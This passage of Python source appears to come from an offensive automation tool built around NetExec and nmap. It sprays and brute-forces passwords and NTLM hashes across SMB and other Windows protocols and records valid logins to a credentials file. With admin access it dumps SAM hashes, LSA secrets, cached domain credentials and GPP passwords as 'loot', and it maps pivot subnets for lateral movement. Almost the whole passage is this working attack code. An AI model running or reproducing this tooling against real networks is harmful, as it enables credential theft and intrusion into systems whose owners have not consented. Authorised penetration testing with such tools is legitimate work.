    with ThreadPoolExecutor(max_workers=10) as pool:
        futs = {pool.submit(tcp_probe, host, PROTOCOL_PORTS[p]): p for p in protos}
        for f in as_completed(futs):
            try:
                if f.result(): open_set.add(futs[f])
            except Exception: pass
    return [p for p in protos if p in open_set]


# ─── Credential / script file output ───────────────────────────────────
CREDS_HEADER = (
    "# nxc3 valid credentials\n"
    "# target\tprotocol\tscope\tdomain\tuser\tauth_type\tsecret\tprivilege\ttimestamp\n"
)

def append_creds(path: str, result: TargetResult) -> None:
    if not result.successes: return
    is_new = not os.path.exists(path)
    now    = datetime.now().isoformat(timespec="seconds")
    with open(path, "a") as f:
        if is_new: f.write(CREDS_HEADER)
        for s in result.successes:
            f.write("\t".join([
                result.real_ip or result.target,
                s.protocol, s.scope,
                s.domain or "-", s.user,
                s.auth_type.value, s.secret,
                "admin" if s.is_admin else "user",
                now,
            ]) + "\n")


# ─── Orchestrator ──────────────────────────────────────────────────────
class NxcPlus:
    def __init__(self, *, targets, users, passwords, hashes, kerberos,
                 protocols, log_file, creds_file, json_out, save_file, script_file,
                 workers, target_workers, quiet, verbose, debug, no_port_probe, extra_hash,
                 spray, spray_delay, auto_enum, timeout_skip, deleg=True,
                 nmap=True, nmap_full=False, nmap_top=1000, nmap_rate=5000,
                 nmap_timeout=300):
        self.nmap         = nmap
        self.nmap_full    = nmap_full
        self.nmap_top     = nmap_top
        self.nmap_rate    = nmap_rate
        self.nmap_timeout = nmap_timeout
        self.targets      = targets
        self.users        = users
        self.passwords    = passwords
        self.hashes       = hashes
        self.kerberos     = kerberos
        self.protocols    = protocols
        self.log_file     = log_file
        self.creds_file   = creds_file
        self.json_out     = json_out
        self.save_file    = save_file
        self.script_file  = script_file
        self.workers      = workers
        self.target_workers = max(1, target_workers)
        self.quiet        = quiet
        self.verbose      = verbose
        self.debug        = debug
        self.no_port_probe = no_port_probe
        self.extra_hash   = extra_hash
        self.spray        = spray
        self.spray_delay  = spray_delay
        self.auto_enum    = auto_enum
        self.timeout_skip = timeout_skip
        self.deleg        = deleg

        self.creds = self._build_creds()
        # No creds = pure recon mode (discover + nmap only, no auth testing)
        self.recon_only = not self.creds

        self._stop        = threading.Event()
        self._procs_lock  = threading.Lock()
        self._procs: set[subprocess.Popen] = set()
        self._progress_lock = threading.Lock()
        self._done = self._total = self._scan_done = 0
        self._scan_total = len(targets)
        self._current_proto = ""
        self.identity_lock = threading.Lock()
        self._reuse_pivots: list = []
        self._spin_frames = "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏"
        self._spin_i = 0
        self._scan_start = 0.0
        self._phase = ""                 # what's happening now (module/proto label)
        self._hb_run = threading.Event()
        self._hb_pause = False           # silence spinner during spray-delay countdown
        self._hb_thread: threading.Thread | None = None
        self._nmap_pool = ThreadPoolExecutor(max_workers=max(1, self.target_workers))

    def _build_creds(self) -> list[Cred]:
        if self.kerberos:
            return [Cred(u, "", AuthType.KERBEROS) for u in self.users]
        pairs: list[Cred] = []
        pairs += [Cred(u, p, AuthType.PASSWORD) for u in self.users for p in self.passwords]
        pairs += [Cred(u, h, AuthType.HASH)     for u in self.users for h in self.hashes]
        return pairs

    def cancel(self) -> None:
        self._stop.set()
        with self._procs_lock:
            for proc in list(self._procs):
                try: proc.terminate()
                except OSError: pass

    # ── progress ──────────────────────────────────────────────────────
    @staticmethod
    def _bar(done: int, total: int, width: int) -> str:
        if total <= 0: return "░" * width
        filled = int(width * done / total)
        return "█" * filled + "░" * (width - filled)

    def _redraw(self) -> None:
        spin = self._spin_frames[self._spin_i % len(self._spin_frames)]
        overall = ""
        if self._scan_total > 1:
            ob = self._bar(self._scan_done, self._scan_total, 20)
            overall = f"{DIM}{ob}{RESET} {self._scan_done}/{self._scan_total} hosts"
        current = ""
        phase = self._phase or self._current_proto
        if self._total > 0:
            tb = self._bar(self._done, self._total, 15)
            label = f"  {phase}" if phase else ""
            current = (f"  {DIM}│{RESET}  {DIM}{tb} "
                       f"{self._done}/{self._total} protos{label}{RESET}")
        elif phase:
            current = f"  {DIM}│{RESET} {phase}"
        # elapsed timer — when a host takes ages, this keeps climbing so it's
        # obvious work is still happening and nothing is hung.
        elapsed = ""
        if self._scan_start:
            secs = int(time.time() - self._scan_start)
            if secs >= 3:
                elapsed = f"  {DIM}· {secs}s{RESET}"
        if not overall and not current and not self._hb_run.is_set():
            return
        sys.stderr.write(f"\r\033[K  {CYAN}{spin}{RESET} {overall}{current}{elapsed}  ")
        sys.stderr.flush()

    def _heartbeat(self) -> None:
        """Keep the spinner turning while a host is being worked, even during a
        long blocking nxc call (SAM/LSA dump, module), so it never looks frozen."""
        if self.quiet or not sys.stderr.isatty():
            return
        while self._hb_run.is_set() and not self._stop.is_set():
            if not self._hb_pause:
                with self._progress_lock:
                    self._spin_i += 1
                    self._redraw()
            time.sleep(0.4)

    def _start_heartbeat(self) -> None:
        if self.quiet or not sys.stderr.isatty() or self._hb_run.is_set():
            return
        self._scan_start = time.time()
        self._hb_run.set()
        self._hb_thread = threading.Thread(target=self._heartbeat, daemon=True)
        self._hb_thread.start()

    def _stop_heartbeat(self) -> None:
        self._hb_run.clear()
        if self._hb_thread:
            self._hb_thread.join(timeout=1)
            self._hb_thread = None
        self._clear_progress()

    def _tick(self, n: int = 1) -> None:
        with self._progress_lock:
            self._done += n; self._redraw()

    def _clear_progress(self) -> None:
        sys.stderr.write("\r\033[K"); sys.stderr.flush()

    def _spin_nmap(self, future, ip: str) -> None:
        """Show a spinner while the background nmap scan finishes, so it doesn't
        look frozen after the fast nxc protocol pass."""
        if self.quiet or not sys.stderr.isatty():
            return
        frames = "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏"
        i = 0
        scope = "all 65535 ports" if self.nmap_full else f"top {self.nmap_top} ports"
        while not future.done() and not self._stop.is_set():
            with self._progress_lock:
                sys.stderr.write(
                    f"\r\033[K  {CYAN}[*]{RESET} {frames[i % len(frames)]} "
                    f"nmap service scan {ip} ({scope}) — this is the slow part, hang on…")
                sys.stderr.flush()
            time.sleep(0.15); i += 1
        self._clear_progress()

    def _say(self, proto, ip, port, host, marker, msg, block_key: str = "") -> None:
        with self._progress_lock:
            self._clear_progress()
            self._redraw()

    # ── subprocess ────────────────────────────────────────────────────
    def _run_proc(self, cmd: list[str], timeout: float) -> tuple[str,str,bool]:
        if self._stop.is_set(): raise InterruptedError()
        try:
            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE,
                                    stderr=subprocess.PIPE, text=True)
        except FileNotFoundError as exc:
            return "", f"executable not found: {exc.filename}", False
        with self._procs_lock: self._procs.add(proc)
        try:
            try:
                out, err = proc.communicate(timeout=timeout)
                return out or "", err or "", False
            except subprocess.TimeoutExpired:
                proc.kill()
                try: proc.communicate(timeout=2)
                except subprocess.TimeoutExpired: pass
                return "", "", True
        finally:
            with self._procs_lock: self._procs.discard(proc)

    def _nxc_cmd(self, proto, target, cred, local_auth) -> list[str]:
        cmd = ["nxc", proto, target, "-u", cred.user]
        if cred.is_kerberos: cmd.append("--use-kcache")
        elif cred.is_hash:   cmd.extend(["-H", cred.secret])
        else:                cmd.extend(["-p", cred.secret])
        if local_auth:       cmd.append("--local-auth")
        cmd.extend(["--timeout", str(NETEXEC_TIMEOUT), "--log", self.log_file])
        return cmd

    @staticmethod
    def _parse_nmap_grep(text: str) -> dict[int, tuple[str, str]]:
        """Parse nmap -oG 'Ports:' lines -> {port: (service, version)}."""
        out: dict[int, tuple[str, str]] = {}
        for line in text.splitlines():
            if "Ports:" not in line:
                continue
            seg = line.split("Ports:", 1)[1]
            for item in seg.split(","):
                parts = item.strip().split("/")
                if len(parts) >= 5 and parts[1] == "open" and parts[2] == "tcp":
                    try: port = int(parts[0])
                    except ValueError: continue
                    name = parts[4] or "?"
                    ver  = (parts[6] if len(parts) > 6 else "").strip()
                    out[port] = (name, ver)
        return out

    def _nmap_scan(self, ip: str) -> list[tuple[int, str, str]]:
        """Service scan. Default: fast top-ports with -sV. --full: all 65535
        in two stages (find open fast, then -sV only those)."""
        if self.nmap_full:
            c1 = ["nmap", "-Pn", "--open", "-p-", "--min-rate", str(self.nmap_rate),
                  "-T4", ip, "-oG", "-"]
            so1, _, t1 = self._run_proc(c1, self.nmap_timeout)
            if t1: return []
            ports = sorted(self._parse_nmap_grep(so1).keys())
            if not ports: return []
            c2 = ["nmap", "-Pn", "-sV", "-p", ",".join(map(str, ports)), ip, "-oG", "-"]
            so2, _, t2 = self._run_proc(c2, self.nmap_timeout)
            svc = self._parse_nmap_grep(so2 if not t2 else so1)
        else:
            c = ["nmap", "-Pn", "--open", "-sV", "--top-ports", str(self.nmap_top),
                 "--min-rate", str(self.nmap_rate), "-T4", ip, "-oG", "-"]
            so, _, t = self._run_proc(c, self.nmap_timeout)
            if t: return []
            svc = self._parse_nmap_grep(so)
        return [(p, svc[p][0], svc[p][1]) for p in sorted(svc)]

    # ── scan one (protocol, scope) ─────────────────────────────────────
    def _scan_protocol(self, proto, target, local_auth,
                       shared_identity,
                       host_skip: threading.Event,
                       show_progress: bool = True
                       ) -> tuple[list[tuple[str,str]], list[Success], str]:
        lines: list[tuple[str,str]] = []
        successes: list[Success]    = []
        target_info = ""
        consecutive_timeouts = 0
        scope_label = "local" if local_auth else "domain"
        port = PROTOCOL_PORTS.get(proto, 0)
        had_output = False

        for cred_idx, cred in enumerate(self.creds):
            if self._stop.is_set() or host_skip.is_set():
                break
            if cred.is_hash     and proto not in WINDOWS_PROTOS: continue
            if cred.is_kerberos and proto not in WINDOWS_PROTOS: continue

            if show_progress:
                with self._progress_lock:
                    self._current_proto = f"{proto.upper()}/{scope_label}"
                    self._redraw()

            cmd = self._nxc_cmd(proto, target, cred, local_auth)
            try:
                stdout, stderr, timed_out = self._run_proc(cmd, SUBPROCESS_TIMEOUT)
            except InterruptedError:
                break

            if timed_out:
                consecutive_timeouts += 1
                if consecutive_timeouts >= MAX_CONSECUTIVE_TIMEOUTS:
                    msg = f"{MAX_CONSECUTIVE_TIMEOUTS} consecutive timeouts — skipped"
                    lines.append(("[!]", msg))
                    with self.identity_lock:
                        live_ip = shared_identity["real_ip"] or target
                        live_host = shared_identity["hostname"] or target
                    if show_progress:
                        self._say(proto, live_ip, port, live_host, "[!]", msg, target)
                    if self.timeout_skip:
                        host_skip.set()   # tell sibling protocols to bail out too
                    break
                continue
            consecutive_timeouts = 0

            for raw in stdout.split("\n"):
                marker, msg = parse_nxc_line(raw.strip())
                if marker:
                    had_output = True

                discovered_ip = extract_ipv4(msg)
                if discovered_ip:
                    with self.identity_lock:
                        shared_identity["real_ip"] = discovered_ip

                discovered_host = extract_hostname(msg)
                if discovered_host:
                    with self.identity_lock:
                        shared_identity["hostname"] = discovered_host

                discovered_domain = extract_domain(msg)
                if discovered_domain:
                    with self.identity_lock:
                        existing = shared_identity.get("domain", "")
                        # Prefer the dotted FQDN realm; never let a short NetBIOS
                        # name overwrite a realm we've already found.
                        if "." in discovered_domain or "." not in existing:
                            shared_identity["domain"] = discovered_domain

                if marker == "[*]":
                    lines.append((marker, msg))
                    if not target_info: target_info = msg
                elif marker == "[+]":
                    sn = f" ({scope_label})" if local_auth else ""
                    lines.append((marker, msg))
                    domain, user, secret, is_admin, is_guest = parse_success_message(msg)
                    if not secret: secret = cred.secret; user = user or cred.user
                    successes.append(Success(
                        protocol=proto, local_auth=local_auth,
                        domain=domain, user=user, secret=secret,
                        auth_type=cred.auth_type,
                        is_admin=is_admin, is_guest=is_guest, raw_message=msg))
                    with self.identity_lock:
                        live_ip = shared_identity["real_ip"] or target
                        live_host = shared_identity["hostname"] or target
                    if show_progress:
                        self._say(proto, live_ip, port, live_host, "[+]", msg + sn, target)
                elif marker in ("[-]", "[!]"):
                    lines.append((marker, msg))

            if stderr and not stdout:
                for raw in stderr.split("\n"):
                    if raw.strip(): lines.append(("[-]", raw.strip()))
        # In recon-only mode (no creds) the nmap ports already list the services,
        # so the "PROTO service detected" lines are just noise — skip them.
        if not lines and proto in self.protocols and not self.recon_only:
            message = f"{proto.upper()} service detected"
            if not had_output:
                message += " (no nxc output)"
            lines.append(("[*]", message))
        return lines, successes, target_info

    # ── anon SMB probe ─────────────────────────────────────────────────
    def _scan_anon_smb(self, target, target_ip, hostname,
                       show_progress: bool = True) -> tuple[list[str],bool]:
        cmd = ["nxc","smb",target,"-u","","-p","",
               "--timeout",str(NETEXEC_TIMEOUT),"--log",self.log_file]
        try:
            stdout, stderr, timed_out = self._run_proc(cmd, SUBPROCESS_TIMEOUT)
        except InterruptedError:
            return [], False
        if timed_out: return ["[!] Anonymous SMB check timed out"], False
        out_lines: list[str] = []; success = False
        for raw in stdout.split("\n"):
            line = raw.strip()
            if not line: continue
            out_lines.append(line)
            marker, msg = parse_nxc_line(line)
            if marker == "[+]":
                success = True
                if show_progress:
                    self._say("SMB", target_ip, 445, hostname, "[+]",
                              msg + " (anonymous)", target)
        if stderr and not stdout:
            for raw in stderr.split("\n"):
                if raw.strip(): out_lines.append(raw.strip())
        return out_lines, success

    # ── auto-enum shares ───────────────────────────────────────────────
    def _auto_enum_shares(self, ip: str, hostname: str) -> list[str]:
        """Run nxc smb --shares with null session and return share lines."""
        cmd = ["nxc","smb",ip,"-u","","-p","","--shares",
               "--timeout",str(NETEXEC_TIMEOUT)]
        try:
            stdout, _, timed_out = self._run_proc(cmd, SUBPROCESS_TIMEOUT)
        except InterruptedError:
            return []
        if timed_out: return ["[!] share enum timed out"]
        lines = []
        for raw in stdout.split("\n"):
            marker, msg = parse_nxc_line(raw.strip())
            if marker in ("[+]","[*]") and ("READ" in msg or "WRITE" in msg or
                                             "SHARE" in msg.upper() or
                                             "print" in msg.lower()):
                lines.append(msg)
        return lines

    # harvest regexes (shared)
    _SAM_RE = re.compile(r"[A-Za-z0-9._$\\-]+:\d+:[a-f0-9]{32}:[a-f0-9]{32}:::")
    _LSA_RE = re.compile(r"^([^\s:]+):([a-f0-9]{32}):([a-f0-9]{32}):::")
    _DCC2_RE = re.compile(r"\$DCC2\$\S+")
    _IPV4_RE = re.compile(r"\b(\d{1,3}(?:\.\d{1,3}){3})\b")
    _LSA_KEYS = ("aes256-cts", "aes128-cts", "des-cbc", "plain_password_hex",
                 "dpapi_machinekey", "dpapi_userkey", "NL$KM")

    def _cred_enum(self, ip: str, s: Success, result: "TargetResult",
                   is_dc: bool = False) -> list[tuple[str, list[str]]]:
        """With a WINNING cred, pull data. Enumeration ladder by access level:
        any valid → shares/users/pass-pol/logged-on; DC → groups + SYSVOL GPP;
        admin (Pwn3d) → SAM/LSA dump + network interfaces (pivot discovery).
        Populates result.{domain_users,plaintext,loot_hashes,pivot_subnets}."""
        def base() -> list[str]:
            c = ["nxc", "smb", ip, "-u", s.user]
            if s.auth_type == AuthType.KERBEROS: c.append("--use-kcache")
            elif s.auth_type == AuthType.HASH:   c += ["-H", s.secret]
            else:                                c += ["-p", s.secret]
            if s.local_auth: c.append("--local-auth")
            return c + ["--timeout", str(NETEXEC_TIMEOUT)]
        checks = [("shares",          base() + ["--shares"]),
                  ("users",           base() + ["--users"]),
                  ("password policy",  base() + ["--pass-pol"]),
                  ("logged-on users", base() + ["--loggedon-users"])]
        if is_dc and not s.local_auth:
            checks += [("groups",                base() + ["--groups"]),
                       ("GPP passwords (SYSVOL)", base() + ["-M", "gpp_password"]),
                       ("GPP autologin (SYSVOL)", base() + ["-M", "gpp_autologin"])]
        if s.is_admin:
            checks += [("SAM hashes (local)",   base() + ["--sam"]),
                       ("LSA secrets",          base() + ["--lsa"]),
                       ("network interfaces",   base() + ["-M", "enum_interfaces"])]
        out: list[tuple[str, list[str]]] = []
        for label, cmd in checks:
            if self._stop.is_set(): break
            with self._progress_lock:
                self._phase = f"enum {ip}: {label}"
                self._redraw()
            try: so, _, timed = self._run_proc(cmd, SUBPROCESS_TIMEOUT)
            except InterruptedError: break
            if timed: continue
            lines = [l for l in self._parse_nxc_findings(so)
                     if not set(l) <= set("- ") and not _is_nxc_noise(l)]

            # ── per-module clean parsing ──
            if label == "shares":
                lines = [l for l in lines
                         if not (l.split()[:1] == ["Share"] and "Permissions" in l)]
            elif label == "users":
                names = self._clean_usernames(lines)
                result.domain_users = sorted(set(result.domain_users) | set(names))
                lines = ([f"{len(names)} users: " + ", ".join(names[:12])
                          + ("…" if len(names) > 12 else "")] if names else [])
            elif label == "password policy":
                lines = self._pass_pol_summary(so)
            elif label == "network interfaces":
                lines = self._parse_interfaces(so, ip, result)
            elif label == "SAM hashes (local)":
                for l in lines:
                    if self._SAM_RE.search(l):
                        result.loot_hashes.append(self._SAM_RE.search(l).group(0))
            elif label == "LSA secrets":
                before_pt = set(result.plaintext)
                before_h  = set(result.loot_hashes)
                self._harvest_lsa(so, result)
                # also catch secrets nxc printed to stdout (not just the files)
                for l in self._parse_nxc_findings(so):
                    if self._SAM_RE.search(l):
                        result.loot_hashes.append(self._SAM_RE.search(l).group(0))
                    elif self._LSA_RE.match(l):
                        result.loot_hashes.append(self._LSA_RE.match(l).group(0))
                    elif (":" in l and not any(k in l for k in self._LSA_KEYS)
                          and " " not in l.split(":")[0]
                          and not re.fullmatch(r"[0-9a-fA-F]{32,}", l.split(":",1)[1].strip() or "x")):
                        result.plaintext.append(l.strip())
                result.plaintext   = list(dict.fromkeys(result.plaintext))
                result.loot_hashes = list(dict.fromkeys(result.loot_hashes))
                np = len(set(result.plaintext) - before_pt)
                nh = len(set(result.loot_hashes) - before_h)
                bits = []
                if np: bits.append(f"{np} PLAINTEXT")
                if nh: bits.append(f"{nh} hash(es)")
                lines = [f"harvested: {', '.join(bits)} → see loot"] if bits else ["dumped (no usable secrets)"]
            elif label.startswith("GPP"):
                lines = [l for l in lines
                         if re.search(r"(?i)\b(?:user(?:name)?s?|pass(?:word)?s?|"
                                      r"cpassword|credential|accountname|runas|"
                                      r"domains?)\b", l)]
                for l in lines:
                    if re.search(r"(?i)password", l):
                        result.plaintext.append(l)

            if lines:
                out.append((label, lines))
            elif _nxc_errored(so):
                out.append((label, ["[enumeration error — see raw nxc log]"]))
        with self._progress_lock:
            self._phase = ""
        return out

    @staticmethod
    def _clean_usernames(lines: list[str]) -> list[str]:
        names = []
        for l in lines:
            tok = l.split()[0] if l.split() else ""
            if (re.fullmatch(r"[A-Za-z0-9._-]{1,64}", tok)
                    and not tok.startswith(("-", "["))
                    and tok.lower() not in ("username", "share", "permissions")):
                names.append(tok)
        return names

    @staticmethod
    def _pass_pol_summary(stdout: str) -> list[str]:
        thr = ""; minlen = ""
        for raw in _ANSI_RE.sub("", stdout).splitlines():
            m = re.search(r"Account Lockout Threshold:\s*(\S+)", raw, re.I)
            if m: thr = m.group(1)
            m = re.search(r"Minimum password length:\s*(\d+)", raw, re.I)
            if m: minlen = m.group(1)
        if not thr and not minlen:
            return []
        if thr.lower() in ("none", "0", ""):
            return [f"no lockout — spray freely" + (f" (min len {minlen})" if minlen else "")]
        return [f"LOCKOUT {thr} attempts (min len {minlen or '?'}) — use --spray"]

    def _parse_interfaces(self, stdout: str, host_ip: str,
                          result: "TargetResult") -> list[str]:
        pivots, shown = set(), []
        for raw in _ANSI_RE.sub("", stdout).splitlines():
            if "|" not in raw or "-IP Address-" in raw:
                continue
            for found in self._IPV4_RE.findall(raw):
                if found == host_ip or found.startswith(("255.", "0.", "127.")):
                    continue
                if re.sub(r"\.\d+$", "", found) != re.sub(r"\.\d+$", "", host_ip):
                    pivots.add(found)
        if pivots:
            subnets = sorted({re.sub(r"\.\d+$", ".0/24", p) for p in pivots})
            result.pivot_subnets = sorted(set(result.pivot_subnets) | set(subnets))
            return [f"DUAL-HOMED → pivot subnet(s): {', '.join(subnets)} "
                    f"(via {', '.join(sorted(pivots))})"]
        return ["single subnet"]

    def _harvest_lsa(self, stdout: str, result: "TargetResult") -> None:
        """Follow nxc's --lsa .secrets/.cached files and pull plaintext +
        machine hash + DCC2, which --lsa only writes to disk, not stdout."""
        paths = re.findall(r"(/\S+\.(?:secrets|cached))", _ANSI_RE.sub("", stdout))
        for path in paths:
            if not os.path.exists(path):
                continue
            try:
                data = open(path, encoding="utf-8", errors="replace").read().splitlines()
            except OSError:
                continue
            for ln in data:
                ln = _ANSI_RE.sub("", ln).strip()
                if not ln:
                    continue
                if self._SAM_RE.search(ln):
                    result.loot_hashes.append(self._SAM_RE.search(ln).group(0)); continue
                if self._DCC2_RE.search(ln):
                    result.loot_hashes.append(self._DCC2_RE.search(ln).group(0)); continue
                lm = self._LSA_RE.match(ln)
                if lm:
                    result.loot_hashes.append(lm.group(0)); continue
                if any(k in ln for k in self._LSA_KEYS):
                    continue
                if ":" in ln:
                    name, _, val = ln.partition(":")
                    if (name and val and " " not in name.strip()
                            and not re.fullmatch(r"[0-9a-fA-F]{32,}", val.strip())):
                        result.plaintext.append(f"{name.strip()}:{val.strip()}")

    # ── one target ─────────────────────────────────────────────────────
    def _scan_target(self, target: str,
                     preprobed_protos: list[str]|None = None,
                     show_progress: bool = True) -> TargetResult:
        result = TargetResult(target=target)
        start = time.time()

        if preprobed_protos is not None:
            open_protos = preprobed_protos
        elif self.no_port_probe:
            open_protos = list(self.protocols)
        else:
            open_protos = probe_protocols(target, self.protocols)
        result.open_protocols   = open_protos
        result.closed_protocols = [p for p in self.protocols if p not in open_protos]

        # A host may be alive on a non-nxc port (web, DNS, SNMP, mail, db) even
        # with no nxc-protocol port open. Don't let the cheap protocol probe
        # alone decide liveness for a recon tool: when it finds nothing, run the
        # full nmap scan and surface whatever ports are actually open — the
        # per-port hints (zone transfer, SNMP walk, gobuster, ...) still apply.
        recon_ports: list[tuple[int, str, str]] = []
        if (self.nmap and not open_protos and not self.no_port_probe
                and not self._stop.is_set()):
            try:
                fut = self._nmap_pool.submit(self._nmap_scan, target)
                if show_progress: self._spin_nmap(fut, target)
                recon_ports = fut.result()
            except Exception:
                recon_ports = []

        # Deep service scan (nmap) runs in the background while the nxc protocol
        # scan happens — reveals web / non-standard ports the probe set misses.
        nmap_future = None
        if self.nmap and open_protos and not self._stop.is_set():
            nmap_future = self._nmap_pool.submit(self._nmap_scan, target)

        if not open_protos and not recon_ports:
            result.scanned = False; result.skipped_reason = "no open ports"
            return result
        if not open_protos:
            # no nxc protocol to authenticate against (web/DNS/mail/db/etc.) —
            # nothing to test, but show the discovered ports + next-step hints.
            result.nmap_ports = recon_ports
            result.elapsed = time.time() - start
            return result

        shared_identity = {
            "real_ip": target,
            "hostname": "",
            "domain": "",
        }
        _ip = target; _host = ""
        tasks: list[tuple[str,bool]] = []
        for proto in open_protos:
            tasks.append((proto, False))
            if proto in LOCAL_AUTH_PROTOS and not self.kerberos:
                tasks.append((proto, True))

        if show_progress:
            with self._progress_lock:
                self._done = 0; self._total = len(tasks); self._redraw()

        start = time.time()
        host_skip = threading.Event()

        with ThreadPoolExecutor(max_workers=max(2, self.workers)) as pool:
            anon_future = None
            if "smb" in open_protos and not self.kerberos and not self.recon_only:
                anon_future = pool.submit(self._scan_anon_smb, target, _ip, _host,
                                          show_progress)

            future_to_task = {
                pool.submit(self._scan_protocol, proto, target, scope,
                            shared_identity, host_skip, show_progress): (proto, scope)
                for proto, scope in tasks
            }
            for fut in as_completed(future_to_task):
                if self._stop.is_set(): break
                proto, scope = future_to_task[fut]
                key = f"{proto}-{'local' if scope else 'domain'}"
                try:
                    lines, successes, tinfo = fut.result()
                except Exception as exc:
                    lines = [("[!]", f"Task error: {exc}")]
                    successes = []; tinfo = ""
                    if self.debug:
                        import traceback; traceback.print_exc()
                result.protocol_lines[key] = lines
                if tinfo and not result.target_info: result.target_info = tinfo
                for s in successes:
                    (result.guests if s.is_guest else result.successes).append(s)
                if show_progress:
                    with self._progress_lock:
                        self._done += 1; self._redraw()

            if anon_future is not None:
                try:
                    al, as_ = anon_future.result()
                except Exception as exc:
                    al = [f"[!] Anonymous SMB error: {exc}"]; as_ = False
                result.anon_smb_lines = al; result.anon_smb = as_

        with self.identity_lock:
            cached_ip = shared_identity["real_ip"]
            cached_host = shared_identity["hostname"]
            cached_domain = shared_identity["domain"]

        result.hostname = cached_host or extract_hostname(result.target_info)
        result.domain   = cached_domain or extract_domain(result.target_info)
        result.is_dc    = looks_like_dc(result.target_info)
        result.real_ip  = cached_ip or target

        if result.real_ip == target:
            for line in result.anon_smb_lines:
                ip = extract_ipv4(line)
                if ip: result.real_ip = ip; break

        # ── auto-enum shares on anon/guest hits ────────────────────────
        if self.auto_enum and (result.anon_smb or result.guests):
            result.share_lines = self._auto_enum_shares(
                result.real_ip, result.hostname)

        # Credentialed enum: a valid SMB cred actually pulls shares (+ SAM/LSA on
        # an admin hit) instead of just reporting that the login worked.
        if self.auto_enum and not self._stop.is_set():
            smb_ok = next((s for s in result.successes if s.protocol == "smb"), None)
            if smb_ok:
                result.cred_enum = self._cred_enum(
                    result.real_ip, smb_ok, result, is_dc=result.is_dc)

        # collect the background nmap service scan
        if nmap_future is not None:
            if show_progress: self._spin_nmap(nmap_future, target)
            try:
                result.nmap_ports = nmap_future.result()
            except Exception as exc:
                if self.debug:
                    import traceback; traceback.print_exc()

        result.elapsed = time.time() - start
        if show_progress:
            self._clear_progress()
        return result

    # ── spray mode ─────────────────────────────────────────────────────
    def _run_spray(self) -> int:
        """Creds-first loop: one credential per round across all targets.
        Safe against lockout — max 1 attempt per account per observation window."""

        # Pre-probe all targets
        print_info("[*]", f"pre-probing {len(self.targets)} targets...")
        alive: list[tuple[str,list[str]]] = []
        if self.no_port_probe:
            alive = [(t, list(self.protocols)) for t in self.targets]
        else:
            with ThreadPoolExecutor(max_workers=self.workers) as pool:
                futs = {pool.submit(probe_protocols, t, self.protocols): t
                        for t in self.targets}
                for f in as_completed(futs):
                    t = futs[f]
                    try:
                        protos = f.result()
                        if protos: alive.append((t, protos))
                    except Exception: pass
        print_info("[*]", f"alive: {len(alive)}/{len(self.targets)} targets")
        if not alive:
            print_info("[!]", "no reachable targets"); return 0

        print()

        orig_creds  = self.creds
        results_map: dict[str, TargetResult] = {}

        self._start_heartbeat()
        for round_idx, cred in enumerate(orig_creds):
            if self._stop.is_set(): break

            # Delay between rounds
            if round_idx > 0 and self.spray_delay > 0:
                preview = (cred.secret[:2] + "***") if cred.secret else "(kerberos)"
                self._hb_pause = True            # let the countdown own the line
                for remaining in range(self.spray_delay, 0, -1):
                    if self._stop.is_set(): break
                    sys.stderr.write(
                        f"\r\033[K  [*] next round ({cred.user}:{preview}) "
                        f"in {remaining}s ...  ")
                    sys.stderr.flush()
                    time.sleep(1)
                sys.stderr.write("\r\033[K"); sys.stderr.flush()
                self._hb_pause = False

            preview = (cred.secret[:2] + "***") if cred.secret else "(kerberos)"
            print_info("[*]", f"round {round_idx+1}/{len(orig_creds)}  —  "
                              f"{cred.user}:{preview}  against {len(alive)} targets")

            self.creds = [cred]
            with self._progress_lock:
                self._scan_done = round_idx
                self._scan_total = len(orig_creds)
                self._done  = 0
                self._total = len(alive)
                self._redraw()

            for target, open_protos in alive:
                if self._stop.is_set(): break
                r = self._scan_target(target, preprobed_protos=open_protos)
                if target not in results_map:
                    results_map[target] = r
                else:
                    ex = results_map[target]
                    ex.successes.extend(r.successes)
                    ex.guests.extend(r.guests)
                    ex.anon_smb = ex.anon_smb or r.anon_smb
                    if r.target_info and not ex.target_info:
                        ex.target_info  = r.target_info
                        ex.hostname     = r.hostname
                        ex.domain       = r.domain
                        ex.is_dc        = r.is_dc
                        ex.real_ip      = r.real_ip or ex.real_ip
                    for k, lines in r.protocol_lines.items():
                        ex.protocol_lines.setdefault(k, []).extend(lines)
                with self._progress_lock:
                    self._done += 1; self._redraw()

            self._clear_progress()

        self._stop_heartbeat()
        self.creds = orig_creds

        # Print results
        results = list(results_map.values())
        for r in results:
            print_target_block(r, self.extra_hash, self.verbose)
            sys.stdout.flush()
            if self.creds_file and r.successes:
                try: append_creds(self.creds_file, r)
                except OSError as exc: print_info("[!]", f"creds file error: {exc}")

        self._clear_progress()
        if len(results) > 1: self._print_summary(results)
        self._run_reuse(results)
        self._run_delegation(results)
        if self.json_out:    self._write_json(results)
        if self.script_file: self._write_script(results)
        self._print_next_steps(results)
        return 130 if self._stop.is_set() else 0

    # ── host discovery pre-pass (CIDRs / large target sets) ────────────
    def _discover_live(self, targets: list[str]) -> dict[str, list[str]]:
        """Fast concurrent sweep: probe each address's nxc-protocol ports once
        and keep only the hosts that answer. Lets a /24 find its handful of live
        hosts up front, then deep-scan only those — instead of grinding the full
        per-host pipeline (nmap + enum) across every address at target_workers."""
        print_info("[*]", f"host discovery — sweeping {len(targets)} addresses "
                          f"for live hosts ...")
        alive: dict[str, list[str]] = {}
        conc = min(len(targets), max(self.workers, 40))
        with ThreadPoolExecutor(max_workers=conc) as pool:
            futs = {pool.submit(probe_protocols, t, self.protocols): t
                    for t in targets}
            done = 0
            for f in as_completed(futs):
                t = futs[f]; done += 1
                try:
                    protos = f.result()
                    if protos: alive[t] = protos
                except Exception:
                    pass
                if not self.quiet and (done % 16 == 0 or done == len(targets)):
                    sys.stderr.write(f"\r\033[K  [*] swept {done}/{len(targets)}  "
                                     f"live: {len(alive)}")
                    sys.stderr.flush()
        if not self.quiet:
            sys.stderr.write("\r\033[K"); sys.stderr.flush()
        def _key(x):
            try: return (0, int(ipaddress.ip_address(x)))
            except ValueError: return (1, 0)
        live_ips = sorted(alive, key=_key)
        shown = ", ".join(live_ips[:12]) + (" ..." if len(live_ips) > 12 else "")
        print_info("[*]", f"live hosts: {len(alive)}/{len(targets)}"
                          + (f"  ->  {shown}" if alive else ""))
        return alive

    # ── normal mode ────────────────────────────────────────────────────
    def run(self) -> int:
        if self.spray:
            if not self.quiet: self._print_banner()
            return self._run_spray()

        if not self.quiet: self._print_banner()

        # For a large target set (e.g. a CIDR), sweep for live hosts first and
